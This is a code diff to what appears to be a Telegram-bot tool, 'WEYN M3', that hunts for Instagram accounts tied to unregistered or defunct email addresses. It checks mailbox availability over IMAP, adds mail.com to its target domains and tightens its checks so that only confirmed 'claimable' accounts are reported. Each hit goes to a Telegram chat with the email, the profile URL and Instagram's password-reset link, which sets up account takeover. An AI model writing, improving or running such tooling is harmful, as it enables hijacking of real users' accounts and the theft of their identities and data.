@@ -1826,15 +1826,17 @@ def _m3_check_v2(email, client):
         return ("unknown", None, None)
 
 
-_HI2_DOMAINS = {'hi2.in', 'telegmail.com'}
+_HI2_DOMAINS = {'hi2.in', 'telegmail.com', 'mail.com'}
 
 _HI2_IMAP_HOSTS = {
     'hi2.in':       'mail.hi2.in',
     'telegmail.com': 'mail.telegmail.com',
+    'mail.com':     'imap.mail.com',
 }
 _HI2_IMAP_FALLBACK = {
     'hi2.in':       'imap.hi2.in',
     'telegmail.com': 'imap.telegmail.com',
+    'mail.com':     'mail.mail.com',
 }
 
 # Words in IMAP error that mean "mailbox does NOT exist" → email is claimable
@@ -1904,8 +1906,8 @@ def _m3_email_available(email):
     if result is None and fallback:
         result = _try_imap(fallback)
 
-    # None = inconclusive / unreachable → fail open
-    return True if result is None else result
+    # None = inconclusive / unreachable → fail CLOSED (don't save emails we can't confirm)
+    return False if result is None else result
 
 
 def _m3_save_hit(token, chat_id, email, method_label="V1", username=None):
@@ -1920,15 +1922,15 @@ def _m3_save_hit(token, chat_id, email, method_label="V1", username=None):
         _m3_total += 1
         hit_num    = _m3_hits
 
-    profile_url  = f"https://www.instagram.com/{username}" if username else ""
-    profile_line = f"PROFILE: {profile_url}\n" if profile_url else ""
+    ig_handle   = username if username else prefix
+    profile_url = f"https://www.instagram.com/{ig_handle}"
     msg = (
         f"WEYN M3 — {domain}\n"
         f"HIT #{hit_num}\n"
         f"EMAIL  : {email}\n"
         f"MASKED : {masked}\n"
         f"STATUS : REGISTERED ({method_label})\n"
-        f"{profile_line}"
+        f"PROFILE: {profile_url}\n"
         f"RESET  : https://www.instagram.com/accounts/password/reset/\n"
         f"_______________________________________\n"
         f"BY ~ @jinbelowg @weyn_vouches"
@@ -1964,7 +1966,7 @@ def _m3_worker(token, chat_id, stop_event, year_choice=None):
         if year_choice is None:
             return True
         if user_pk is None:
-            return True  # no pk extracted — don't block the hit
+            return False  # can't verify year → fail closed, skip unverifiable hits
         return gdate(user_pk) == year_choice
 
     def _try_save(email, label, username, user_pk):
